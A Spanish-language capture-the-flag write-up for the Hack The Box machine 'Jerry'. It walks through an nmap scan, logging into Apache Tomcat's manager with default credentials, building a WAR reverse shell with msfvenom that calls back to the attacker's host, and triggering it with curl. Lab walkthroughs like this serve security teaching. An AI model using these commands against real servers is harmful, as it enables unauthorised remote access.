---
title: Jerry - HTB Writeup
date: 2023-09-06 22:00:00 +0800
categories: [Writeups, HTB]
tags: [Easy, Windows]
image:
  path: /assets/img/post/jerry/catherine-heath-i4W8OINLI_I-unsplash.jpg
---

**Jerry** es una máquina de dificultad ```Easy``` en la plataforma **Hack The Box**

En esta máquina explotaremos una vulnerabilidad en el servicio ```Apache``` por el puerto ```8080```

## **Reconocimiento**

Como siempre utilizaremos la herramienta ```nmap``` para reportar los puertos abiertos en la máquina víctima:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.95 -oG allPorts
```

![img](/assets/img/post/jerry/feb426c5-b454-4f82-aaa7-5949a66c0751.png)

En la máquina esta abierto solamente el puerto ```8080``` , si introducimos la ```URL``` en el buscador junto al puerto, podemos ver lo siguiente:

![img](/assets/img/post/jerry/0701b41c-55c8-4188-ba3f-75cf0c92fbcc.png)

Podemos **loguearnos** en el servicio **Apache Tomcat** con las credenciales predeterminadas ```tomcat:s3cret```:

![img](/assets/img/post/jerry/658a5dde-829f-4032-8068-8d70f427a1e0.png)

Vemos que hay una sección donde podemos **subir archivos** ```.war``` , la cual usaremos para conseguir acceso al sistema: 

![img](/assets/img/post/jerry/f13630bf-58f1-4988-bdea-0e9e224c5fc1.png)

### Web Aplication Resource Files

> Un archivo ```WAR```, es un formato de archivo utilizado para **empaquetar y distribuir aplicaciones web** en la plataforma **Java**. Este contiene todos los recursos necesarios para ejecutar una aplicación web en un solo archivo comprimido.

## Explotación

Usaremos la herramienta ```msfvenom``` para crear una ```reverse shell``` en windows y poder acceder mediante ```nc```:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.15 LPORT=443 -f war > rev_shell.war
```

![img](/assets/img/post/jerry/6f231e1c-e4ea-4e1c-a7ea-c9341910e71c.png)

Además deberemos saber el nombre del archivo ```.jsp``` para activarla con la herramienta ```curl``` , por lo tanto usaremos ```jar``` para enumerar el contenido del archivo ```.war```:

![img](/assets/img/post/jerry/bc65ae69-5fe0-4c28-a763-84e8280629c9.png)

Ahora subiremos la reverse shell, mediante la web utilizando ```curl``` , nos pondremos en escucha en otra terminal mediante ```nc```:

```bash
curl http://10.10.10.95:8000/rev_shell/mdeonxmbgy.jsp
```

![img](/assets/img/post/jerry/7bd0c1bc-d7de-4a35-b8df-496fc4bce938.png)

De esta manera ya tendremos acceso completo a la máquina víctima, en donde podremos encontrar las flags en el ```Desktop``` del usuario ```administrator```

Espero que haya ayudado, se agradece cualquier tipo de comentario para mejorar poco a poco. Adios!